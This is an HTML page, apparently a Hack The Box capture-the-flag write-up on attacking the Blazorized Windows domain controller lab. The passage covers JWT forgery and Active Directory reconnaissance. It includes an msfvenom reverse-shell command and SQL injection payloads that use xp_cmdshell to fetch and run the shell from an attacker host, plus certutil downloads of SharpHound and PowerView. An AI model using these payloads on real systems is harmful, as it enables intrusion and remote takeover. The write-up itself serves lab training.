<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Blazorized</title>
<meta name=description content="Platform: Hack The Box Link: Blazorized Level: Hard OS: Windows Read this write up in french
Blazorized features a variety of Active Directory attacks. We begin …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-blazorized/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Blazorized"><meta property="og:description" content="Platform: Hack The Box Link: Blazorized Level: Hard OS: Windows Read this write up in french
Blazorized features a variety of Active Directory attacks. We begin …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Blazorized"><meta name=twitter:description content="Platform: Hack The Box Link: Blazorized Level: Hard OS: Windows Read this write up in french
Blazorized features a variety of Active Directory attacks. We begin …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-blazorized/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-blazorized/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-blazorized/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-blazorized/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Blazorized</h1><small role=doc-subtitle></small><p class=post-date>12 min read |
<span class=post-date>November 7, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Blazorized>Blazorized</a></li><li>Level: Hard</li><li>OS: Windows</li></ul><hr><p><a href=https://scorpiosec.com/fr/posts/htb-blazorized/>Read this write up in french</a></p><p>Blazorized features a variety of Active Directory attacks. We begin by examining a web server hosting a Blazor WebAssembly application with restricted content access. Through enumeration, we locate several DLL files associated with the application. Decompiling one of these files reveals sensitive information, which we leverage to forge a JSON Web Token (JWT). This grants us access to an admin panel where we identify a SQL injection vulnerability, providing our initial foothold.</p><p>Upon running Bloodhound, we discover that the current user has the <code>WriteSPN</code> privilege, enabling a targeted Kerberoasting attack for lateral movement to another user. This second user has permissions to modify the <code>Script-Path</code> of yet another user, allowing further lateral movement. After a second Bloodhound run, we find that our final user is in a group with the <code>DCSync</code> privilege on the Domain Controller, which we use to launch a DCSync attack in order to obtain the administrator’s hash.</p><p>Target IP address - <code>10.10.11.22</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.22 Blazorized
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49678,49683,49708,49776
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-11-07 18:52 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.22
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.065s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://blazorized.htb
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-11-08 00:52:33Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: blazorized.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  tcpwrapped
</span></span><span style=display:flex><span>1433/tcp  open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2022</span> 16.00.1115.00; RC0+
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.10.11.22<span style=color:#98c379>\B</span>LAZORIZED: 
</span></span><span style=display:flex><span>|     Target_Name: BLAZORIZED
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: BLAZORIZED
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC1
</span></span><span style=display:flex><span>|     DNS_Domain_Name: blazorized.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: DC1.blazorized.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: blazorized.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.10.11.22<span style=color:#98c379>\B</span>LAZORIZED: 
</span></span><span style=display:flex><span>|     Instance name: BLAZORIZED
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2022</span> RC0+
</span></span><span style=display:flex><span>|       number: 16.00.1115.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2022</span>
</span></span><span style=display:flex><span>|       Service pack level: RC0
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>true</span>
</span></span><span style=display:flex><span>|     TCP port: <span style=color:#d19a66>1433</span>
</span></span><span style=display:flex><span>|_    Clustered: <span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2024-11-07T10:01:36
</span></span><span style=display:flex><span>|_Not valid after:  2054-11-07T10:01:36
</span></span><span style=display:flex><span>|_ssl-date: 2024-11-08T00:53:37+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: blazorized.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style=display:flex><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49674/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>49678/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49683/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49708/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49776/tcp open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2022</span> 16.00.1115.00; RC0+
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.10.11.22:49776: 
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2022</span> RC0+
</span></span><span style=display:flex><span>|       number: 16.00.1115.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2022</span>
</span></span><span style=display:flex><span>|       Service pack level: RC0
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>true</span>
</span></span><span style=display:flex><span>|_    TCP port: <span style=color:#d19a66>49776</span>
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.10.11.22:49776: 
</span></span><span style=display:flex><span>|     Target_Name: BLAZORIZED
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: BLAZORIZED
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC1
</span></span><span style=display:flex><span>|     DNS_Domain_Name: blazorized.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: DC1.blazorized.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: blazorized.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_ssl-date: 2024-11-08T00:53:37+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2024-11-07T10:01:36
</span></span><span style=display:flex><span>|_Not valid after:  2054-11-07T10:01:36
</span></span><span style=display:flex><span>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-11-08T00:53:30
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 73.71 seconds
</span></span></code></pre></div><p>From the nmap output we find several things:</p><ul><li>We are dealing with a domain controller (the domain name is <code>blazorized.htb</code>).</li><li>There is a web server with a redirection to <code>http://blazorized.htb</code>.</li><li>The target is running MSSQL on port <code>1433</code>.</li></ul><h2 id=enumeration>Enumeration</h2><p>Before checking the web server we do some SMB enumeration, but both netexec and enum4linux fail.</p><p><img src=/images/HTB-Blazorized/netexec_smb_enum.png alt="netexec smb enumeration"></p><p><img src=/images/HTB-Blazorized/enum4linux_smb.png alt="enum4linux smb enumeration"></p><p>At <code>http://blazorized.htb/</code> we find a personal website built with Blazor Web Assembly.</p><p><img src=/images/HTB-Blazorized/Blazorized_website.png alt="Blazorized website"></p><p><img src=/images/HTB-Blazorized/Blazorized_tech_stack.png alt="Blazorized wappalyzer"></p><p>When we select the other sections such as <code>Interesting Digital Gardens</code> and <code>Misc. Links</code> we get the message <code>Failed fetching data from the API of Blazorized</code>.</p><p><img src=/images/HTB-Blazorized/failed_fetching.png alt="Blazorized failed data fetching"></p><p>In the <code>Check for Updates</code> section we learn that only the super admin can check the content. Although we are invited to use the button provided, clicking it only provides the message <code>Failed to Update Blazorized's Content!</code>.</p><p><img src=/images/HTB-Blazorized/check_updates.png alt="Blazorized check updates"></p><p>We continue our enumeration with some directory brute forcing but it is unfruitful.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blazorized.htb
</code></pre><p>With subdomain enumeration we discover <code>admin</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blazorized.htb -H &#34;Host: FUZZ.blazorized.htb&#34; -ic -fs 144
</code></pre><p><img src=/images/HTB-Blazorized/subdomain_enum.png alt="subdomain enumeration"></p><p>At <code>http://admin.blazorized.htb/</code> we find the super admin login page.</p><p><img src=/images/HTB-Blazorized/super_admin_login.png alt="super admin login"></p><p>When dealing with an application using a tech stack we are not familiar with, it is always a good thing to read the documentation. On this <a href=https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#location-of-the-blazor-script>Github page</a> we learn that a Blazor application always need a Blazor script which is a critical file for the functioning on the app.</p><p>We also read that Blazor web applications use json files.</p><p><img src=/images/HTB-Blazorized/Blazor_script.png alt="Blazor script location"></p><p><img src=/images/HTB-Blazorized/blazor_json_files.png alt="Blazor json files"></p><p>We bring up the developer tools (with the <code>F12</code> key) and find <code>_framework/blazor.webassembly.js</code>.</p><p><img src=/images/HTB-Blazorized/blazor_script_found.png alt="Blazor script found in Blazorized"></p><p>After opening it we find some code that is not well formatted, we use <a href=https://beautifier.io/>beautifier.io</a> to make it more readable.</p><p><img src=/images/HTB-Blazorized/js_file_beautified.png alt="Blazor script beautified"></p><blockquote><p>I was overwhelmed by the amount of JavaScript code in front of me, and due to my inexperience with Blazor WebAssembly, I didn’t know what to look for. In hindsight, I should have focused more on the <code>_framework</code> directory, which holds the essential application files. It would have helped me find the exploitation path quicker.</p></blockquote><p>We get a lot of JavaScript code but nothing really stands out. Let&rsquo;s move to Burp Suite, we will use the <code>Blazor Traffic Processor</code> extension to help with our enumeration.</p><p><img src=/images/HTB-Blazorized/BTP_extension.png alt="BTP extension"></p><p>Burp picks up a lot of dll files under <code>_framework</code>. We can download any of them by going to <code>http://blazorized.htb/_framework/xxx.dll</code> (example: <code>blazorized.htb/_framework/Markdig.dll</code>), but doing it manually will surely be tedious.</p><p><img src=/images/HTB-Blazorized/dll_files_found.png alt="DLL files found"></p><p>At the bottom of the DLL file list in Burp, we find a file called <code>blazor.boot.json</code>. This file serves as a reference for all the DLL files that need to be loaded for the application to function correctly.</p><p><img src=/images/HTB-Blazorized/blazor_boot_json.png alt="blazor boot json"></p><p>Going to <code>http://blazorized.htb/_framework/blazor.boot.json</code> does indeed bring up the same list of DLL files under <code>assembly</code> plus another file called <code>Blazorized.Helpers.dll</code> which we were not seeing in Burp.</p><p><img src=/images/HTB-Blazorized/DLL_files.png alt="DLL files list"></p><p>Further research revealed that it is not unusual for Blazor WebAssembly applications to expose their DLL files; in fact, this is part of how Blazor WebAssembly works.</p><p>These applications are unique in that they run client-side in the browser through WebAssembly. To execute .NET code in the browser:</p><ol><li>The browser must download the DLL files, including application code and dependencies.</li><li>The WebAssembly runtime provided by Blazor loads and runs these DLLs on the client.</li></ol><p>However, it is up to the developers of these applications to ensure that no <strong>sensitive data or critical business logic</strong> is included in the client-side DLL files.</p><p>Let&rsquo;s download the files and try to find something exploitable, we will use the python script below.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>os</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>json</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>json_url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;http://blazorized.htb/_framework/blazor.boot.json&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>output_dir</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;dll_files&#39;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>os</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>makedirs</span>(<span style=color:#e06c75>output_dir</span>, <span style=color:#e06c75>exist_ok</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>True</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>get</span>(<span style=color:#e06c75>json_url</span>)
</span></span><span style=display:flex><span><span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>json</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>download_dll</span>(<span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>dll_url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#39;http://blazorized.htb/_framework/</span><span style=color:#98c379>{</span><span style=color:#e06c75>dll_name</span><span style=color:#98c379>}</span><span style=color:#98c379>&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>file_path</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>os</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>path</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>(<span style=color:#e06c75>output_dir</span>, <span style=color:#e06c75>dll_name</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>dll_response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>get</span>(<span style=color:#e06c75>dll_url</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>dll_response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>raise_for_status</span>()  <span style=color:#7f848e># Check for request errors</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>with</span> <span style=color:#e5c07b>open</span>(<span style=color:#e06c75>file_path</span>, <span style=color:#98c379>&#39;wb&#39;</span>) <span style=color:#c678dd>as</span> <span style=color:#e06c75>file</span>:
</span></span><span style=display:flex><span>            <span style=color:#e06c75>file</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>write</span>(<span style=color:#e06c75>dll_response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>content</span>)
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#39;Downloaded </span><span style=color:#98c379>{</span><span style=color:#e06c75>dll_name</span><span style=color:#98c379>}</span><span style=color:#98c379>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>except</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>exceptions</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>RequestException</span> <span style=color:#c678dd>as</span> <span style=color:#e06c75>e</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#39;Failed to download </span><span style=color:#98c379>{</span><span style=color:#e06c75>dll_name</span><span style=color:#98c379>}</span><span style=color:#98c379>: </span><span style=color:#98c379>{</span><span style=color:#e06c75>e</span><span style=color:#98c379>}</span><span style=color:#98c379>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#98c379>&#39;resources&#39;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span> <span style=color:#56b6c2>and</span> <span style=color:#98c379>&#39;assembly&#39;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span>[<span style=color:#98c379>&#39;resources&#39;</span>]:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span>[<span style=color:#98c379>&#39;resources&#39;</span>][<span style=color:#98c379>&#39;assembly&#39;</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>items</span>():
</span></span><span style=display:flex><span>        <span style=color:#e06c75>download_dll</span>(<span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#98c379>&#39;resources&#39;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span> <span style=color:#56b6c2>and</span> <span style=color:#98c379>&#39;lazyAssembly&#39;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span>[<span style=color:#98c379>&#39;resources&#39;</span>]:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span>[<span style=color:#98c379>&#39;resources&#39;</span>][<span style=color:#98c379>&#39;lazyAssembly&#39;</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>items</span>():
</span></span><span style=display:flex><span>        <span style=color:#e06c75>download_dll</span>(<span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Download complete.&#34;</span>)
</span></span></code></pre></div><p>Let&rsquo;s use <a href=https://www.decompiler.com/>decompiler.com</a> to decompile our DLL files (you can also use DNSpy on Windows).</p><blockquote><p>I went through a TON of decompilations that turned out to be useless so I&rsquo;m going to skip to the right one.</p></blockquote><p>Decompile <code>Blazorized.Helpers.dll</code> and go to <code>Blazorized.Helpers</code> &ndash;> <code>JWT.cs</code>. Here we find everything that is needed to create a Super Admin JWT token. We will use <a href=https://jwt.io/>jwt.io</a> to generate it.</p><p><img src=/images/HTB-Blazorized/JWT_info.png alt="JWT info"></p><p><img src=/images/HTB-Blazorized/JWT_info2.png alt="JWT info2"></p><p><img src=/images/HTB-Blazorized/JWT_info3.png alt="JWT info3"></p><p>Below is all the information we need:</p><pre tabindex=0><code># For the Header (make sure to change the algorithm to 512 at the top of the page)

&#34;alg&#34;: 512
&#34;typ&#34;: &#34;JWT&#34;

# For the payload

&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&#34;: &#34;superadmin@blazorized.htb&#34;
&#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&#34;: &#34;Super_Admin&#34;
&#34;iss&#34;: &#34;http://api.blazorized.htb&#34;
&#34;aud&#34;: &#34;http://admin.blazorized.htb&#34;
&#34;exp&#34;: &#34;xxxxxxxxxxx&#34; 

# In the VERIFY SIGNATURE section just paste the value of jwtSymmetricSecurityKey
</code></pre><blockquote><p>Do not use the <code>exp</code> value in the screenshot, it won&rsquo;t be valid anymore by the time you read this write up. Instead use <a href=https://www.epochconverter.com/>EpochConverter</a> to generate a valid value. If the current time exceeds the <code>exp</code> timestamp, the token will be rejected as expired. (A good value to use is your current day at 11:59 PM, provided that it is not past that time yet).</p></blockquote><p><img src=/images/HTB-Blazorized/jwt_value.png alt="JWT value"></p><p>Once you have your encoded value go to <code>http://admin.blazorized.htb/</code>, open the dev tools with <code>F12</code>, go to <code>Storage</code> &ndash;> <code>Local Storage</code> and add your token with</p><pre tabindex=0><code>key = jwt
Value = YOUR_ENCODED_JWT
</code></pre><p><img src=/images/HTB-Blazorized/jwt_local_storage.png alt="JWT local storage"></p><p>After refreshing the page we access the Super Admin Panel.</p><p><img src=/images/HTB-Blazorized/super_admin-panel.png alt="Super Admin Panel"></p><h2 id=initial-foothold>Initial Foothold</h2><p>In the <code>Check Duplicate Post Titles</code> section we find a feature that is most likely using the datbase (MSSQL), we will use this and try to get a reverse shell via SQL injections.</p><ol><li>We start by creating a malicious <code>exe</code> file.</li></ol><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f exe -o shell.exe
</code></pre><ol start=2><li>After setting up a web server, we drop the file on the target system.</li></ol><pre tabindex=0><code>&#39;; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;) = 1 EXEC master.dbo.xp_cmdshell &#39;powershell -c &#34;curl http://YOUR_IP:WEBSERVER_PORT/shell.exe -o %TEMP%\shell.exe&#34; --
</code></pre><p><img src=/images/HTB-Blazorized/revshell1.png alt="malicious file dropped on target"></p><ol start=3><li><p>We start a listener in Metasploit via <code>exploit/multi/handler</code>.</p></li><li><p>We execute the malicous <code>exe</code> file on the target and obtain a meterpreter shell as <code>NU_1055</code>.</p></li></ol><pre tabindex=0><code>&#39;; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;) = 1 EXEC master.dbo.xp_cmdshell &#39; %TEMP%\shell.exe --
</code></pre><p><img src=/images/HTB-Blazorized/foothold.png alt="Meterpreter shell foothold"></p><p>We find the user flag in the user Desktop.</p><p><img src=/images/HTB-Blazorized/user_flag.png alt="user flag"></p><h3 id=lateral-movement-shell-as-rsa_4810>Lateral Movement (shell as RSA_4810)</h3><p>Usually we would run Bloodhound with some credentials in order to gather all the data about the domain. When we do not have access to any credentials we can use <a href=https://github.com/BloodHoundAD/SharpHound>SharpHound</a> to obtain that information.</p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
</code></pre><p><img src=/images/HTB-Blazorized/download_sharphound.png alt="SharpHound transfer"></p><p><img src=/images/HTB-Blazorized/sharhound_zip.png alt="SharpHound zip file"></p><p>We download the <code>zip</code> archive on our local machine, extract it, and load the files in Bloodhound.</p><p>Find user <code>NU_1055</code>, then go to <code>Node Info</code> &ndash;> <code>First Degree Object Control</code> under <code>OUTBOUND OBJECT CONTROL</code>. We discover that the user has the <code>WriteSPN</code> right over the user <code>RSA_4810</code>.</p><blockquote><p>SPNs are identifiers used by Kerberos to associate a service with a particular account in Active Directory. When a client requests access to a service (identified by its SPN), it requests a Service Ticket for that service from the Domain Controller. For our Kerberoast attack, we will request a Service Ticket for the specific SPN we will create. Since Service Tickets are encrypted with the NTLM hash of the service account’s password, after obtaining these tickets, we can try to crack the hash offline in order recover the service account password.</p></blockquote><p><img src=/images/HTB-Blazorized/WriteSPN_Abuse.png alt="WriteSPN abuse"></p><ol><li>Transfer <code>PowerView.ps1</code> to the target.</li></ol><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1
